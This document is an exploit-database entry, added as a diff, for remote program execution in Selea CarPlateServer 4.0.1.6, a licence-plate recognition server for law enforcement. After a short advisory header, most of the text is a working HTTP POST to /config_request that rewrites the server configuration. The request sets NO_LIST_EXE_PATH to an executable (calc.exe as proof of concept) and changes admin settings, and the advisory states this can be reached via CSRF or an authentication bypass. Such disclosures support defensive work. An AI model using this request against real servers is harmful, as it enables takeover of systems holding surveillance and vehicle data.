@@ -1,0 +1,286 @@
+# Exploit Title: Selea CarPlateServer (CPS) 4.0.1.6 - Remote Program Execution
+# Date: 08.11.2020
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.selea.com
+
+Selea CarPlateServer (CPS) v4.0.1.6 Remote Program Execution
+
+
+Vendor: Selea s.r.l.
+Product web page: https://www.selea.com
+Affected version: 4.0.1.6(210120)
+                  4.013(201105)
+                  3.100(200225)
+                  3.005(191206)
+                  3.005(191112)
+
+Summary: Our CPS (Car Plate Server) software is an advanced solution that can
+be installed on computers and servers and used as an operations centre. It can
+create sophisticated traffic control and road safety systems connecting to
+stationary, mobile or vehicle-installed ANPR systems. CPS allows to send alert
+notifications directly to tablets or smartphones, it can receive and transfer
+data through safe encrypted protocols (HTTPS and FTPS). CPS is an open solution
+that offers full integration with main video surveillance software. Our CPS
+software connects to the national operations centre and provides law enforcement
+authorities with necessary tools to issue alerts. CPS is designed to guarantee
+cooperation among different law enforcement agencies. It allows to create a
+multi-user environment that manages different hierarchy levels and the related
+division of competences.
+
+Desc: The server suffers from an arbitrary win32/64 binary executable execution
+when setting the NO_LIST_EXE_PATH variable to a program of choice. The command
+will be executed if proper trigger criteria is met. It can be exploited via CSRF
+or by navigating to /cps/ endpoint from the camera IP and bypass authentication
+gaining the ability to modify the running configuration including changing the
+password of admin and other users.
+
+Tested on: Microsoft Windows 10 Enterprise
+           SeleaCPSHttpServer/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2021-5622
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5622.php
+
+
+08.11.2020
+
+--
+
+
+POST /config_request?ACTION=WRITE HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 6309
+Authorization: Basic ZmFrZTpmYWtl
+Accept: application/json, text/plain, */*
+LoginMode: angular
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75
+AuthToken: 6d0c4568-5c17-11eb-ab5f-54e1ad89571a
+content-type: application/json
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+
+{
+  "ACTIONS": {
+    "ANIA_LIST_DAYS_NUM": "15",
+    "ANIA_LIST_PWD": "",
+    "ANIA_LIST_USER": "{B64valuehereommited}",
+    "BLACK_LIST_COUNTRY": "",
+    "EXACT_MATCH": "false",
+    "FUZZY_MATCH": "true",
+    "MINISTEROTRASPORTI_LIST_DAYS_NUM": "15",
+    "MINISTEROTRASPORTI_LIST_ENABLE_CHECK": "0,1",
+    "MINISTEROTRASPORTI_LIST_GET_OWNERS": "false",
+    "MINISTEROTRASPORTI_LIST_PWD": "",
+    "MINISTEROTRASPORTI_LIST_SIGNAL_MISSING_CARPLATE": "false",
+    "MINISTEROTRASPORTI_LIST_SIGNAL_MISSING_REVISION": "false",
+    "MINISTEROTRASPORTI_LIST_USER": "",
+    "MINISTEROTRASPORTI_LIST_USE_SELEA_SERVER": "false",
+    "MINISTEROTRASPORTI_LIST_USE_VPN": "true",
+    "MINISTEROTRASPORTI_LIST_VPN_PASSWORD": "",
+    "MINISTEROTRASPORTI_LIST_VPN_USERNAME": "",
+    "MINISTERO_LIST_DAYS_NUM": "24",
+    "MINISTERO_LIST_PWD": "",
+    "MINISTERO_LIST_USER": "",
+    "NO_LIST_ENABLED": "true",
+    "NO_LIST_ENABLE_EXE": "true",
+    "NO_LIST_EXE_PATH": "C:/windows/system32/calc.exe",
+    "NO_LIST_HTTP": "http://localhost:8080/$TRIGGER_EXE_VAR",
+    "NO_LIST_HTTP_ENABLED": "false",
+    "NO_LIST_SEND_TCP_ALARM": "",
+    "PERMISSIVE_MATCH": "true",
+    "WHITE_LIST_ALLOWED_COUNTRY_TYPE_INFO": ""
+  },
+  "CAMERAINFO": {
+    "BA__________": {
+      "APPROACHING": "",
+      "CustomCameraId": "",
+      "CustomGateId": "",
+      "DetectDesc": "ZSL",
+      "DetectId": "",
+      "Direction": "",
+      "GPSLocation": "",
+      "GateDesc": "3",
+      "GateId": "",
+      "LEAVING": "",
+      "ZoneName": "",
+      "setname": "false",
+      "skip": "false"
+    }
+  },
+  "CONTEXT": {
+    "BA__________": {
+      "URL": [
+        "https://www.zeroscience.mk"
+      ]
+    }
+  },
+  "DBMS": {
+    "DB_NAME": "",
+    "DB_PASSWORD": "",
+    "DB_SERVER": "",
+    "DB_TYPE": "sqlite",
+    "DB_USERNAME": "",
+    "ENCRYPT_DB": "false",
+    "SQLITE_MAX_MB_RAM_CACHE": "-1"
+  },
+  "EMAIL": {
+    "DEST": "",
+    "FROM_EMAIL": "",
+    "FROM_NAME": "",
+    "LOG_USER_SEARCH": "false",
+    "MIN_EMAIL_TIME": "5",
+    "PASSWORD": "",
+    "PORT": "25",
+    "SEND_EMAIL_ON_TAMPER": "false",
+    "SERVER": "",
+    "SSL": "false",
+    "USERNAME": "",
+    "XOAUTH2": "false"
+  },
+  "EMAIL-XOAUTH2": {
+    "refresh_token": ""
+  },
+  "EZ_CLIENTS": {
+    "PASSWORD": "",
+    "SLAVES": "",
+    "USERNAME": "",
+    "USE_CNTLM": "false",
+    "WANT_CTX": "false"
+  },
+  "EZ_CLIENT_SCNTT": {
+    "CTX": "true",
+    "HOST": "",
+    "PASSWORD": "",
+    "PORT": "443",
+    "USERNAME": ""
+  },
+  "FTPSYNC": {
+    "DELETE_OLD_SYNC_DAYS": "7",
+    "JSON_CONFIG": "eyJzZXJ2ZXJzX2NvbmZpZyI6IFtdfQ==",
+    "SAVE_FTP_SEND_ERRORS": "true"
+  },
+  "GLOBAL_HTTP_PROXY": {
+    "CNTLM_ENABLED": "false",
+    "EZ_ADDRESS": "cps.selea.com",
+    "EZ_PORT": "8999",
+    "HOST": "",
+    "NON_PROXY_HOST": "localhost|^(10|127|169\\.254|172\\.1[6-9]|172\\.2[0-9]|172\\.3[0-1]|192\\.168)\\..+",
+    "PASSWORD": "",
+    "PORT": "",
+    "PROXY_ENABLED": "true",
+    "USERNAME": ""
+  },
+  "HTTPS": {
+    "CERTIFICATE": "",
+    "ENABLE_HTTP2": "true",
+    "GET_CERTIFICATE_FROM_SELEA": "false",
+    "PRIVATE_KEY": "",
+    "ROOT_CERTIFICATE": ""
+  },
+  "MASTER_CPS": {
+    "ENABLED": "true",
+    "MASTERS": "",
+    "PASSWORD": "",
+    "USERNAME": ""
+  },
+  "PROXY_TCP": {
+    "ENABLED": "false",
+    "USE_HTTP_PROXY": "false"
+  },
+  "REMOTE_LIST": {
+    "ADDRESS": "",
+    "ENABLED": "false",
+    "PASSWORD": "",
+    "PORT": "",
+    "USERNAME": ""
+  },
+  "REPORT": {
+    "STATS_AGGREGATE": "true",
+    "STATS_ENABLED": "false",
+    "STATS_FREQ": "MONTH",
+    "STATS_PATH": "",
+    "STATS_SELECTED": "",
+    "STATS_WEEK_DAY": "Mon"
+  },
+  "SCNTT": {
+    "LIST_A1_DAYS_LIMIT": "0",
+    "SCNTT_PASSWORD": "",
+    "SCNTT_PRIV_KEY_FILENAME": "",
+    "SCNTT_PUB_CERT": "",
+    "SCNTT_SYSTEM_DESC": "",
+    "SCNTT_SYSTEM_ID": "",
+    "SCNTT_USERNAME": ""
+  },
+  "SETTINGS": {
+    "ALLOW_FLASH_NOTIFICATIONS": "true",
+    "AUTO_UPDATE": "true",
+    "BACKUP_AT_SPECIFIC_HOUR": "-1",
+    "BACKUP_DB_PATH": "",
+    "BACKUP_EVERY_HOURS": "0",
+    "CARPLATE_DETAILS_ENABLED": "false",
+    "CHECK_EXPIRING_CARPLATES": "false",
+    "CHECK_EXPIRING_CARPLATES_DAYS": "7",
+    "CHECK_FILENAME_SYNTAX": "true",
+    "DB_DELETE_DAYS": "90",
+    "DB_DELETE_ENABLE": "false",
+    "DB_DELETE_LOG_DAYS": "7",
+    "DB_DELETE_OCR_FILE": "90",
+    "DB_STATS_DELETE_DAYS": "90",
+    "DISABLE_WHITELIST_REMOTE_DB_CHECK": "false",
+    "ENCRYPT_IMAGES": "false",
+    "FREE_DISK_LIMIT": "1000",
+    "FRIENDLY_NAME": "test",
+    "FTP_CUSTOM_PORT_RANGE": "false",
+    "FTP_DOWNLOAD_DISABLED": "true",
+    "FTP_ENABLED": "true",
+    "FTP_EXTERN_IP": "",
+    "FTP_EXTERN_IP_AUTO": "false",
+    "FTP_LIST_DIR_DISABLED": "true",
+    "FTP_MAX_PORT": "0",
+    "FTP_MIN_PORT": "0",
+    "FTP_PORT": "21",
+    "FTP_USERS": "",
+    "FTP_USE_FTPS": "true",
+    "HTTP2_PORT": "8081",
+    "HTTP_PASSWORD": "CR_B_B64/emEEokEfjdQqWo5pfQtoTCA80va3gcU",
+    "HTTP_PORT": "8080",
+    "HTTP_USERNAME": "admin",
+    "IGNORE_CONTEXT_FOR_UNREADFAKE": "false",
+    "IGNORE_IF_NOT_SYNTAX_MATCH": "false",
+    "MILESTONE_CONNECTIONS": "5",
+    "MILESTONE_ENABLED": "true",
+    "MILESTONE_ENABLE_ACTIVE_CONNECTION": "false",
+    "MILESTONE_PORT": "5666",
+    "MILESTON_REMOTE_IP": "",
+    "MILESTON_REMOTE_PORT": "8080",
+    "MIN_LOG_LEVEL": "0",
+    "PERIODIC_BACKUP_CONFIG": "0",
+    "REMOVE_BLACK_LIST_ON_EXPIRE": "true",
+    "REMOVE_NON_ALARM_CARPLATE": "false",
+    "REMOVE_WHITE_LIST_ON_EXPIRE": "true",
+    "SAVE_GATEWAY_SEND_ERRORS": "true",
+    "SAVE_GATEWAY_SEND_ERRORS_MAX_DAYS": "7",
+    "SEND_EMAIL_ON_LOST_CONNECTION": "false",
+    "SEND_EMAIL_ON_LOST_CONNECTION_MIN_TIME": "600",
+    "SEND_EMAIL_ON_NO_PLATE_READ": "false",
+    "SEND_EMAIL_ON_NO_PLATE_READ_MIN_TIME": "12",
+    "SERVER_NTP_ON": "false",
+    "SERVER_NTP_PORT": "123",
+    "USE_HTTPS": "false"
+  },
+    "VPNC": {
+    "VPN_NET_NAME": ""
+  },
+  "TCP_TEMPLATES": []
+}
